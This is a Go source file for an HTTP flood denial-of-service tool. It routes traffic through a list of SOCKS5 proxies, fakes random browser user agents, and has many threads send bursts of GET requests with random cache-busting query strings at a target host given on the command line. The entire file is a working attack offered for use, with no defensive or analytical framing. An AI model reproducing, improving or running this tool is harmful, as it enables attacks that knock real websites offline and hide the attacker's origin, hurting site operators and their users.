package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var (
	host        = os.Args[1]
	port        = os.Args[2]
	thread, err = strconv.Atoi(os.Args[3])
	path        = os.Args[4]
	proxies     []string
	headers     string
	userAgents  []string
	c           = "qwertyuiopasdfghjklzxcvbnm1234567890-_"
	osList      = []string{
		"iOS",
		"Windows",
		"X11",
		"Android",
	}

	ios = []string{
		"iPhone; CPU iPhone OS 13_3 like Mac OS X",
		"iPad; CPU OS 13_3 like Mac OS X",
		"iPod touch; iPhone OS 4.3.3",
		"iPod touch; CPU iPhone OS 12_0 like Mac OS X",
	}

	android = []string{
		"Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
		"Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
		"Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
		"Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
		"Linux; Android 5.1.1; vivo X7 Build/LMY47V",
		"Linux; Android 6.0; Nexus 5 Build/MRA58N",
		"Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
		"Linux; Android 8.0.0; SM-N9500 Build/R16NW",
		"Linux; Android 9.0; SAMSUNG SM-G950U",
	}

	windows = []string{
		"Windows NT 10.0; Win64; X64",
		"Windows NT 10.0; WOW64",
		"Windows NT 5.1; rv:7.0.1",
		"Windows NT 6.1; WOW64; rv:54.0",
		"Windows NT 6.3; Win64; x64",
		"Windows NT 6.3; WOW64; rv:13.37",
	}

	x11 = []string{
		"X11; Linux x86_64",
		"X11; Ubuntu; Linux i686",
		"SMART-TV; Linux; Tizen 2.4.0",
		"X11; Ubuntu; Linux x86_64",
		"X11; U; Linux amd64",
		"X11; GNU/LINUX",
		"X11; CrOS x86_64 11337.33.7",
		"X11; Debian; Linux x86_64",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func randchars() string {
	return "?" + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + "=" + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))])
}

func getUserAgent() string {
	var osName string = osList[rand.Intn(len(osList))]
	var version string
	if osName == "iOS" {
		version = ios[rand.Intn(len(ios))]
	}
	if osName == "Android" {
		version = android[rand.Intn(len(android))]
	}
	if osName == "Windows" {
		version = windows[rand.Intn(len(windows))]
	}
	if osName == "X11" {
		version = x11[rand.Intn(len(x11))]
	}
	return "Mozzila 5.0 " + "(" + version + ")" + " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + strconv.Itoa(rand.Intn(91-60)+60) + ".0." + strconv.Itoa(rand.Intn(5000-4000)+4000) + "." + strconv.Itoa(rand.Intn(60-40)+40) + " Safari/537.36"
}

func main() {
	var wg sync.WaitGroup
	for i := 0; i < 500; i++ {
		userAgents = append(userAgents, getUserAgent())
	}
	f, _ := os.Open("socks5.txt")
	defer f.Close()
	br := bufio.NewReader(f)
	for {
		a, _, c := br.ReadLine()
		if c == io.EOF {
			break
		}
		proxies = append(proxies, string(a))
	}
	for i := 0; i < thread; i++ {
		wg.Add(1)
		go func(wg *sync.WaitGroup) {
			defer wg.Done()
			var s net.Conn
			for {
				var proxyAddress string = proxies[rand.Intn(len(proxies))]
				addr, _ := url.Parse("socks5://" + proxyAddress)
				socks, err := proxy.FromURL(addr, proxy.Direct)
				if err != nil {
					continue
				}
				var UserAgent string = "User-Agent: " + userAgents[rand.Intn(len(userAgents))] + "\r\n"
				var Connection string = "Connection: Keep-Alive\r\n"
				var c string = "Cache-Control: no-cache\r\n"
				var p string = "Pragma: no-cache\r\n"
				var Accept string = "Accept: */*\r\n"
				for {
					s, err = socks.Dial("tcp", host+":"+port)
					if port == "443" {
						s = tls.Client(s, &tls.Config{
							ServerName:         host,
							InsecureSkipVerify: true,
						})
					}
					if err != nil {
						break
					} else {
						defer s.Close()
						for i := 0; i < 100; i++ {
							headers = "GET " + path + randchars() + " HTTP/1.1\r\nHost: " + host + "\r\n" + UserAgent + Connection + c + p + Accept + "\r\n"
							go s.Write([]byte(headers))
						}
						fmt.Println("Flood sent " + proxyAddress)
					}
				}
			}
		}(&wg)
	}
	wg.Wait()
}
